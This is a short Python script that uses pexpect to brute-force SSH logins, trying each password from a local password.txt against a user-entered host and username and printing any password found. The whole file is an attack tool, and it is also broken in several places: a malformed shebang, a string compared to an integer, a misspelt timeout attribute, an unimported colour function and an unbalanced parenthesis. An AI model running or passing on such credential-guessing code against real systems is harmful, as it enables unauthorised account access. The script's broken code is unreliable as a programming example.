!/usr/bin/python


import pexpect
import threading
import termcolor
PROMPT=['#','>>>','>','\$']


def connect(user,host,password):
        ssh_newkey='Are you sure you wnat to cntinue connecting'
        conStr='ssh '+user+ '@'+host
        child = pexpect.spawn(conStr)
        ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword'])
        if ret=='0':
                print("error connecting")
                return
        if ret==1:
                child.sendline('yes')
                ret=child.expect([pexpect.timeout,'[P|p]assword'])
                if ret==0:
                        print("Error connecting")
                        return
        child.sendline(password)
        child.expect(PROMPT,timeout=2)
        return child




def main():
        host=input("Enter the ip address: ")
        usr=input("Enter the user name: ")
        file= open("password.txt",'r')
        for i in file.readlines():
                i=i.strip('\n')
                try:
                       #t=threading.Thread(target=connect,args=(usr,host,i))
                       # t.start()
                        child=connect(usr,host,i)
                        print(colored("[+]Password found: "+ i,'green')
                except:
                        print("[-]Password not found: "+i)



main()
